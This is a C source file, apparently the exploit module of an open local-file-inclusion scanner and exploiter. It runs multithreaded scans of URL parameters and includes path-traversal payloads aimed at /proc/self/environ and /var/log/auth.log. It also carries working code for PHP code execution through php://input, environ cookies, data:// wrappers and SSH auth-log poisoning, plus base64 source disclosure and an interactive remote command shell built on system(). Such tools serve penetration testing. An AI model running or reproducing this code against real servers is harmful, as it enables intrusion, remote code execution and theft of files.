#include "kadimus_xpl.h"
#include "string/base64.h"
#include "string/urlencode.h"
#include "string/hexdump.h"
#include "string/diff.h"
#include "string/concat.h"
#include "string/utils.h"

char *build_datawrap(const char *phpcode){
    char *ret, *b64, *b64safe;

    b64 = b64encode(phpcode, strlen(phpcode));
    b64safe = urlencode(b64);
    free(b64);

    ret = concatl(DATA_WRAP, b64safe, NULL);
    free(b64safe);

    return ret;
}

void build_rce_exploit(CURL *curl, const char *url, const char *pname,
    const char *phpcode, int tech){
    char *cookieptr, *data_wrap_uri, *aux;

    switch(tech){
        case INPUT:
        case AUTH:
            curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, strlen(phpcode));
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, phpcode);
        break;

        case ENVIRON:
            if(global.cookies){
                cookieptr = concatl(global.cookies, "&", phpcode, NULL);
                curl_easy_setopt(curl, CURLOPT_COOKIE, cookieptr);
                free(cookieptr);
            } else {
                curl_easy_setopt(curl, CURLOPT_COOKIE, phpcode);
            }
        break;

        case DATA:
            aux = build_datawrap(phpcode);
            data_wrap_uri = build_url_simple(url, pname, aux, replace_string);
            curl_easy_setopt(curl, CURLOPT_URL, data_wrap_uri);
            free(data_wrap_uri);
            free(aux);
        break;
    }
}


bool check_auth_poison(const char *target){
    char *phpcode, rbuf[R_SIZE], regex[VULN_SIZE], rfile[20], *mapfile;
    bool ret = false;
    int fsize, fd;
    CURL *curl;
    FILE *fh;

    if((fh = get_random_file(10, rfile)) == NULL)
        die("error while generate tmp file", 0);

    curl = init_curl(NULL);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, fh);
    curl_easy_setopt(curl, CURLOPT_URL, target);

    randomstr(rbuf, sizeof(rbuf));
    concatlb(regex, rbuf, "Vulnerable", rbuf, NULL);
    phpcode = make_code(rbuf, "<?php echo \"Vulnerable\"; ?>", true);

    build_rce_exploit(curl, NULL, NULL, phpcode, AUTH);

    if(http_request(curl)){
        fclose(fh);

        fd = readonly(rfile);

        fsize = get_file_size(fd);
        if(fsize){
            mapfile = (char *) mmap(0, fsize, PROT_READ, MAP_PRIVATE, fd, 0);

            if(!regex_match(AUTH_LOG_REGEX, mapfile, fsize, PCRE_MULTILINE))
                die("[-] be sure the file is /var/log/auth.log",0);

            if(regex_match(regex, mapfile, fsize, 0))
                ret = true;
        }

        close(fd);
    } else {
        die("[-] without connection", 0);
    }

    curl_easy_cleanup(curl);
    unlink(rfile);
    free(phpcode);

    return ret;

}

bool ssh_log_poison(const char *target, int port){
    ssh_session ssh_id;
    bool ret = false;

    ssh_id = ssh_new();

    if(ssh_id == NULL)
        return ret;

    ssh_options_set(ssh_id, SSH_OPTIONS_HOST, target);

    if(port)
        ssh_options_set(ssh_id, SSH_OPTIONS_PORT, &port);

    if(ssh_connect(ssh_id) != SSH_OK){
        printf("[-] failed to connect: %s\n", ssh_get_error(ssh_id));
    } else {
        if( ssh_userauth_password(ssh_id, STAIRWAY2HEAVEN, "AC/DC") == SSH_AUTH_ERROR )
            printf("[-] failed to send exploit\n");
        else
            ret = true;

        ssh_disconnect(ssh_id);
    }

    ssh_free(ssh_id);
    return ret;
}

bool check_error(const char *body){
    bool ret = false;
    char *line = NULL;
    size_t len = 0;
    ssize_t nread;

    FILE *fh = xfopen(ERROR_FILE, "r");

    while((nread = getline(&line, &len, fh)) != -1){
        if(nread <= 1)
            continue;

        if(line[nread-1] == '\n')
            line[nread-1] = 0x0;

        if(regex_match(line, body, 0, 0)){
            good_single("regex match: ( %s )\n", line);
            ret = true;
            break;
        }
    }


    fclose(fh);
    xfree(line);

    return ret;
}

int is_dynamic(const char *url){
    int result = 0;
    struct request body1, body2;

    CURL *ch1 = init_curl(&body1);
    CURL *ch2 = init_curl(&body2);


    curl_easy_setopt(ch1, CURLOPT_URL, url);
    curl_easy_setopt(ch2, CURLOPT_URL, url);

    init_str(&body1);
    init_str(&body2);


    if(!http_request(ch1) || !http_request(ch2)){
        result = -1;
        goto end;
    }

    if(body1.len == body2.len){
        if(strcmp(body1.ptr, body2.ptr) == 0){
            result = 0;

            if(check_error(body1.ptr))
                result = 2;
        }
        else
            result = 1;
    } else {
        result = 1;
    }

    end:
        curl_easy_cleanup(ch1);
        curl_easy_cleanup(ch2);
        xfree(body1.ptr);
        xfree(body2.ptr);

    return result;
}

int rce_scan(const char *base, struct parameter_list *plist, int p){

    static const char *environ_t[] = {
        "/proc/self/environ",
        "../../../../../../../../../../../proc/self/environ",
        "/proc/self/environ%00",
        "../../../../../../../../../../../proc/self/environ%00",
        NULL
    };

    static const char *input_t[] = {
        "php://input",
        "php://input%00",
        NULL
    };

    static const char *auth_t[] = {
        "/var/log/auth.log",
        "../../../../../../../../../../../var/log/auth.log",
        "/var/log/auth.log%00",
        "../../../../../../../../../../../var/log/auth.log%00",
        NULL
    };

    char rbuf[R_SIZE], regex[VULN_SIZE],
    *php_code = NULL, *rce_uri = NULL;

    int size_file, fd;

    struct request body;
    size_t ret = 0, i = 0;

    FILE *auth_scan_file;

    CURL *curl = init_curl(&body);

    randomstr(rbuf, sizeof(rbuf));
    concatlb(regex, rbuf, "Vulnerable", rbuf, NULL);
    php_code = make_code(rbuf, "<?php echo 'Vulnerable'; ?>", false);

    info_single("testing php://input ...\n");
    for(i=0; input_t[i] != NULL; i++){
        init_str(&body);
        rce_uri = build_url(base, plist, p, input_t[i], replace_string);

        curl_easy_setopt(curl, CURLOPT_URL, rce_uri);
        build_rce_exploit(curl, NULL, NULL, php_code, INPUT);
        info_single("requesting: %s\n", rce_uri);

        if(!http_request(curl)){
            error_single("request error\n");
        } else {
            if(regex_match(regex, body.ptr, 0, 0)){
                print_thread("[RCE-INPUT] %s\n", rce_uri);
                good_single("target vulnerable: %s !!!\n", rce_uri);

                ret = 1;
                xfree(rce_uri);
                xfree(body.ptr);

                break;
            }
        }

        xfree(rce_uri);
        xfree(body.ptr);
    }

    if(!ret) warn_single("probably not vulnerable\n");
    info_single("php://input test finish\n");

    curl_easy_cleanup(curl);
    ret = 0;

    /* proc/self/environ test */
    info_single("testing /proc/self/environ ...\n");

    curl = init_curl(&body);

    for(i=0; environ_t[i]!=NULL; i++){
        init_str(&body);
        rce_uri = build_url(base, plist, p, environ_t[i], replace_string);
        info_single("requesting: %s\n", rce_uri);

        curl_easy_setopt(curl, CURLOPT_URL, rce_uri);
        build_rce_exploit(curl, NULL, NULL, php_code, ENVIRON);

        if(!http_request(curl)){
            error_single("request error\n");
        } else {
            if( regex_match(regex, body.ptr, 0, 0) ){
                print_thread("[RCE-ENVIRON] %s\n", rce_uri);
                good_single("target vulnerable !!!\n");

                ret = 1;
                xfree(body.ptr);
                xfree(rce_uri);

                break;
            }
        }

        xfree(body.ptr);
        xfree(rce_uri);
    }

    if(!ret) warn_single("probably not vulnerable\n");
    info_single("/proc/self/environ test finish\n");

    curl_easy_cleanup(curl);

    /* start wrap scanner */

    curl = init_curl(&body);
    init_str(&body);

    info_single("testing data wrap ...\n");

    char *b64datawrap = build_datawrap(php_code);
    char *datawrap = build_url(base, plist, p, b64datawrap, replace_string);
    curl_easy_setopt(curl, CURLOPT_URL, datawrap);

    if(!http_request(curl)){
        error_single("request error\n");
        //print_single("[-] Request error\n");
        //print_single("[-] probably not vulnerable\n");
    } else {
        if( regex_match(regex, body.ptr, 0, 0) ){

            print_thread("[RCE-DATA-WRAP] %s\n", datawrap);
            good_single("%s\n", datawrap);
            good_single("target vulnerable !!!\n");

        } else {
            warn_single("probably not vulnerable\n");
        }
    }

    info_single("data wrap test finish\n");

    curl_easy_cleanup(curl);
    xfree(body.ptr);
    free(datawrap);
    free(b64datawrap);
    /* auth.log scan */
    //curl = init_curl(&body);

    curl = init_curl(NULL);
    ret = 0;

    info_single("testing /var/log/auth.log ...\n");
    char *mmap_str = NULL;
    //struct stat s;
    //int size_porra,fd;
    char random_file[20];

    for(i=0; auth_t[i]!=NULL; i++){
        rce_uri = build_url(base, plist, p, auth_t[i], replace_string);

        if( (auth_scan_file = get_random_file(10, random_file)) == NULL)
            die("error while generate tmp file",0);

        curl_easy_setopt(curl, CURLOPT_URL, rce_uri);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)auth_scan_file);

        info_single("requesting: %s\n", rce_uri);
        if(!http_request(curl)){
            error_single("request error\n");
        } else {
            fflush(auth_scan_file);
            fd = readonly(random_file);
            size_file = get_file_size(fd);

            if(size_file){
                mmap_str = (char *) mmap(0, size_file, PROT_READ, MAP_PRIVATE, fd, 0);

                if( regex_match(AUTH_LOG_REGEX, mmap_str, size_file, PCRE_MULTILINE )){//PCRE_MULTILINE) ){//PCRE_MULTILINE) ){
                    print_thread("[RCE-AUTH-LOG] %s\n", rce_uri);
                    print_single("[~] %s\n", rce_uri);
                    print_single("[+] Vulnerable !!!\n");
                    ret = 1;
                }
            }
            close(fd);
        }


        fclose(auth_scan_file);
        unlink(random_file);
        xfree(rce_uri);
        if(ret) break;
    }

    if(!ret) warn_single("probably not vulnerable\n");
    info_single("/var/log/auth.log test finish\n");

    curl_easy_cleanup(curl);
    xfree(php_code);

    return 0;
}

void source_disclosure_get(const char *url, const char *filename, const char *pname, FILE *out){
    struct request body1, body2;
    char *urlfilter, *filter, *content_diff, *decoded;
    size_t len;

    filter = xmalloc(strlen(filename)+sizeof(FILTER_WRAP));
    memcpy(filter, FILTER_WRAP, sizeof(FILTER_WRAP));
    strcat(filter, filename);

    urlfilter = build_url_simple(url, pname, filter, replace_string);
    free(filter);

    if(!urlfilter){
        error_single("parameter %s not found !!!\n", pname);
        return;
    }

    CURL *ch1 = init_curl(&body1);
    CURL *ch2 = init_curl(&body2);

    init_str(&body1);
    init_str(&body2);

    curl_easy_setopt(ch1, CURLOPT_URL, url);
    curl_easy_setopt(ch2, CURLOPT_URL, urlfilter);
    free(urlfilter);

    info_single("trying get source code of file: %s\n", filename);

    if(!http_request(ch1) || !http_request(ch2))
        goto end;

    content_diff = diff(body1.ptr, body2.ptr);

    if(!content_diff){
        error_single("cannot detect base64 output\n");
        goto end;
    }

    trim(&content_diff);

    if((decoded = b64decode(content_diff, &len))){
        good_single("valid base64 returned:\n");
        if(out){
            fwrite(decoded, len, 1, out);
            fclose(out);
            info_single("check the output file\n");
        } else {
            fwrite(decoded, len, 1, stdout);
        }
        printf("\n");
        free(decoded);
    } else {
        error_single("invalid base64 detected\n");
        info_single("try use null byte poison, or set filename without extension\n");
    }

    free(content_diff);

    end:
    curl_easy_cleanup(ch1);
    curl_easy_cleanup(ch2);
    free(body1.ptr);
    free(body2.ptr);
}

int check_files(char *base, struct parameter_list *plist, int p){
    char *line = NULL, *file, *regex, *file_uri = NULL;
    struct request body;
    int result = 0;
    size_t n = 0;
    ssize_t nread;

    FILE *fh = xfopen(CHECK_FILES, "r");
    CURL *ch = init_curl(&body);

    while((nread = getline(&line, &n, fh)) != -1){
        if(nread < 3 || line[0] == '#' || line[0] == ':')
            continue;

        if(line[nread-1] == '\n')
            line[nread-1] = 0x0;


        file = line;
        regex = strchr(line, ':');
        if(!regex)
            continue;

        *regex = 0;
        regex++;

        if(regex[0] == 0x0)
            continue;

        init_str(&body);

        file_uri = build_url(base, plist, p, file, replace_string);
        curl_easy_setopt(ch, CURLOPT_URL, file_uri);

        info_single("requesting: %s\n", file_uri);

        if(!http_request(ch)){
            error_single("no connection with the target URL, exiting ...\n");
        } else {
            if(regex_match(regex, body.ptr, body.len, 0)){
                print_thread("[FILE] %s | (%s)\n", file_uri, regex);
                //print_single("[~] %s\n", file_uri);
                good_single("regex match: %s\n", regex);
                good_single("check the url: %s\n", file_uri);
            }
        }

        xfree(body.ptr);
        xfree(file_uri);
    }

    xfree(line);
    fclose(fh);
    curl_easy_cleanup(ch);

    return result;
}

void exec_phpcode(const char *url, const char *parameter, const char *code, int type){
    char *rce_code, rbuf[8], regex[M_ALL_SIZE];
    struct curl_slist *chunk = NULL;
    struct request body;
    char **match = NULL;
    CURL *curl;
    int len = 0;

    init_str(&body);
    curl = init_curl(&body);

    info_single("trying exec code ...\n");

    curl_easy_setopt(curl, CURLOPT_URL, url);
    chunk = curl_slist_append(chunk, "Connection: close");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);

    rce_code = make_code(randomstr(rbuf, sizeof(rbuf)), code, (type == AUTH));
    build_rce_exploit(curl, url, parameter, rce_code, type);

    concatlb(regex, rbuf, "(.*)", rbuf, NULL);

    if(http_request(curl)){
        match = regex_extract(regex, body.ptr, body.len, PCRE_DOTALL, &len);
    }

    info_single("result: \n");

    if(len > 0){
        printf("%s\n", match[0]);
        regex_free(match);
    } else {
        error_single("nothing to show !\n");
    }

    info_single("finish\n");

    free(body.ptr);
    free(rce_code);
    curl_easy_cleanup(curl);
    curl_slist_free_all(chunk);
}

void rce_http_shell(const char *url, const char *parameter, int technique){
    char *aux, *phpcode, **match;
    void *map;
    size_t mapsize;
    int fd, len;

    struct request body;
    CURL *curl;
    char rbuf[R_SIZE], regex[56], cmd[512], random_file[20];

    void *bodyptr;
    ssize_t nbytes;

    FILE *fh;

    if(technique != AUTH)
        bodyptr = &body;
    else
        bodyptr = NULL;

    curl = init_curl(bodyptr);

    curl_easy_setopt(curl, CURLOPT_URL, url);

    randomstr(rbuf, sizeof(rbuf));
    concatlb(regex, rbuf, "(.*)", rbuf, NULL);

    aux = xmalloc(600);

    while(1){
        printf("(kadimus~shell)> ");
        fflush(stdout);

        nbytes = read(0, cmd, sizeof(cmd)-1);
        if(!nbytes) break;

        if(cmd[nbytes-1] == '\n')
            cmd[nbytes-1] = 0x0;
        else
            cmd[nbytes] = 0x0;

        if(!cmd[0])
            continue;

        if(!strcmp(cmd, "exit"))
            break;

        sprintf(aux, "<?php system(\"%s\"); ?>", cmd);
        phpcode = make_code(rbuf, aux, (technique == AUTH) ? true : false);

        if(technique != AUTH){
            init_str(&body);
        } else {
            if((fh = get_random_file(10, random_file)) == NULL)
                die("error while generate random file",0);

            curl_easy_setopt(curl, CURLOPT_WRITEDATA, fh);
        }

        build_rce_exploit(curl, url, parameter, phpcode, technique);

        if(http_request(curl)){
            if(technique == AUTH){
                fclose(fh);
                fd = readonly(random_file);
                mapsize = get_file_size(fd);
                if(mapsize){
                    map = (char *) mmap(0, mapsize, PROT_READ, MAP_PRIVATE, fd, 0);
                    match = regex_extract(regex, map, mapsize, PCRE_DOTALL, &len);
                    close(fd);
                    munmap(map, mapsize);
                } else {
                    len = 0;
                }
            } else {
                match = regex_extract(regex, body.ptr, body.len, PCRE_DOTALL, &len);
            }

            if(len > 0) {
                printf("%s", match[0]);
                regex_free(match);
            }

        }

        if(technique != AUTH)
            free(body.ptr);
        else
            unlink(random_file);

        free(phpcode);
    }

    free(aux);

    curl_easy_cleanup(curl);
}

int common_error_check(const char *uri){
    int result = 0;
    struct request body;
    CURL *ch = init_curl(&body);

    init_str(&body);

    curl_easy_setopt(ch, CURLOPT_URL, uri);

    if(!http_request(ch)){
        result = -1;
    } else {
        if(check_error(body.ptr))
            result = 1;
    }

    curl_easy_cleanup(ch);
    xfree(body.ptr);
    return result;
}

int disclosure_check(const char *uri, const char *xuri){
    struct request body1, body2;
    char *decoded;
    size_t len;
    char *b64 = NULL;
    int result = 0;

    CURL *ch1 = init_curl(&body1);
    CURL *ch2 = init_curl(&body2);

    init_str(&body1);
    init_str(&body2);

    curl_easy_setopt(ch1, CURLOPT_URL, uri);
    curl_easy_setopt(ch2, CURLOPT_URL, xuri);

    if(!http_request(ch1) || !http_request(ch2)){
        result = -1;
        goto end;
    }

    b64 = diff(body1.ptr, body2.ptr);

    if(!b64)
        goto end;

    trim(&b64);

    if((decoded = b64decode(b64, &len))){
        result = 1;

        if(!thread_on){
            good_all("target probably vulnerable, hexdump: \n\n");
            hexdump(decoded, len, 0);
            print_all("\n");
        }

        free(decoded);
    }

    free(b64);

    end:
        curl_easy_cleanup(ch1);
        curl_easy_cleanup(ch2);
        free(body1.ptr);
        free(body2.ptr);

    return result;
}

void scan(const char *target){
    char *base_uri = NULL, *parameters = NULL;
    char *source_disc = NULL, *error_uri = NULL;
    char rbuf[R_SIZE];

    int result = 0;
    size_t i = 0;
    bool dynamic = false, previous_error = false;
    struct parameter_list plist = { .len = 0, .parameter = 0, .trash = 0};

    extract_url(target, &base_uri, &parameters);

    if(!base_uri || !parameters)
        goto end;

    tokenize(parameters, &plist);
    xfree(parameters);


    info_all("starting scanning the URL: %s\n", target);
    info_all("testing if URL have dynamic content ...\n");
    result = is_dynamic(target);

    if(result == -1){
        error_all("no connection with the target URL, exiting ...\n");
        goto end;
    }

    else if(result == 0 || result == 2){
        info_all("URL dont have dynamic content\n");
        dynamic = false;
    }

    else if(result == 1){
        warn_all("URL have dynamic content\n");
        warn_all("skipping source disclosure test\n");
        dynamic = true;
    }

    if(result == 2){
        good_all("common error found, common error checking will be skipped\n");
        previous_error = true;
    }

    for(i=0; i<plist.len; i++){
        if(!plist.parameter[i].key[0])
            continue;

        info_all("analyzing '%s' parameter ...\n", plist.parameter[i].key);

        if(!previous_error && plist.parameter[i].value){
            info_all("checking for common error messages\n");
            error_uri = build_url(base_uri, &plist, i, randomstr(rbuf, sizeof(rbuf)), replace_string);
            info_all("using random url: %s\n",error_uri);
            result = common_error_check(error_uri);

            if(result == -1){
                goto end;
            }

            else if(result == 1){
                info_all("error found !!!\n");
            }

            else {
                warn_all("no errors found\n");
            }

            xfree(error_uri);
        }

        if(!dynamic && plist.parameter[i].value){
            info_all("starting source disclosure test ...\n");

            source_disc = build_url(base_uri, &plist, i, FILTER_WRAP, append_before);
            result = disclosure_check(target, source_disc);

            if(result == -1)
                goto end;
            else if(result == 1){

            } else {
                warn_all("parameter does not seem vulnerable to source disclosure\n");
            }

            xfree(source_disc);
        }

        info_all("checking common files ...\n");
        check_files(base_uri, &plist, i);
        info_all("common files check finished\n");

        info_all("checking for RCE ...\n");
        rce_scan(base_uri, &plist, i);
        info_all("RCE check finished\n");


    }

    end:
    free(plist.trash);
    free(plist.parameter);
    xfree(base_uri);
    xfree(parameters);
    xfree(error_uri);
    xfree(source_disc);

    info_all("scan finish !!!\n\n");
    return;
}

void scan_list(struct kadimus_opts *opts){
    size_t n = 0, i, thread_count = 0;
    pthread_t *thrs = NULL;
    char *line = NULL;
    ssize_t nread;
    pcre *re;

    if(opts->threads){
        if((thrs = calloc(opts->threads, sizeof(pthread_t))) == NULL)
            die("calloc() error",1);

        init_locks();
        thread_on = true;
    }

    re = xpcre_compile(URL_REGEX, PCRE_NO_AUTO_CAPTURE);

    while((nread = getline(&line, &n, opts->list)) != -1){
        if(nread == -1)
            break;

        if(nread <= 1)
            continue;

        if(line[nread-1] == '\n')
            line[nread-1] = 0x0;

        if(regex_match_v2(re, line, nread-1, 0))
            continue;

        if(!opts->threads){
            scan(line);
            continue;
        }

        pthread_create(&thrs[thread_count], 0, thread_scan, (void *) xstrdup(line));
        thread_count++;

        if(thread_count == opts->threads){
            for(i=0; i < opts->threads; i++){
                pthread_join(thrs[i], NULL);
                thrs[i] = 0;
            }
            thread_count = 0;
        }
    }

    if(opts->threads){
        for(i=0; i<opts->threads; i++){
            if(thrs[i])
                pthread_join(thrs[i], NULL);
        }
        xfree(thrs);
        kill_locks();
    }

    free(line);
    pcre_free(re);
    fclose(opts->list);
}


void *thread_scan(void *url){
    char *target_uri = ((char *) url);
    char *base_uri = NULL, *parameters = NULL;
    char *source_disc = NULL, *error_uri = NULL;
    char rbuf[R_SIZE];
    struct parameter_list plist = { .len = 0, .parameter = 0, .trash = 0};

    int result = 0;
    size_t i = 0;
    bool dynamic = false, previous_error = false;

    extract_url(target_uri, &base_uri, &parameters);

    if(!base_uri || !parameters)
        goto end;

    tokenize(parameters, &plist);
    xfree(parameters);

    printf("[SCANNING] %s\n",target_uri);
    result = is_dynamic(target_uri);

    if(result == -1)
        goto end;

    else if(result == 0)
        dynamic = false;

    else if(result == 1)
        dynamic = true;

    else if(result == 2){
        dynamic = false;
        previous_error = true;
        print_thread("[PREV-LFI-ERROR] %s\n",target_uri);
    }

    for(i=0; i <plist.len; i++){
        if(!plist.parameter[i].key[0])
            continue;

        if(!previous_error && plist.parameter[i].value){
            error_uri = build_url(base_uri, &plist, i, randomstr(rbuf, sizeof(rbuf)), replace_string);
            result = common_error_check(error_uri);

            //if(result == -1)
            //    goto end;
            if(result == 1)
                print_thread("[COMMON-LFI-ERROR] %s\n",error_uri);

            xfree(error_uri);
        }

        if(!dynamic && plist.parameter[i].value){
            source_disc = build_url(base_uri, &plist, i, FILTER_WRAP, append_before);
            result = disclosure_check(target_uri, source_disc);

            //if(result == -1)
            //    goto end;
            if(result == 1)
                print_thread("[RSD] %s | %s\n", target_uri, plist.parameter[i].key);

            xfree(source_disc);

        }

        check_files(base_uri, &plist, i);
        rce_scan(base_uri, &plist, i);

    }

    end:
        free(plist.trash);
        free(plist.parameter);

        xfree(target_uri);
        xfree(base_uri);
        xfree(parameters);
        //xfree(error_uri);
        //xfree(source_disc);


    return (void *)0;
}
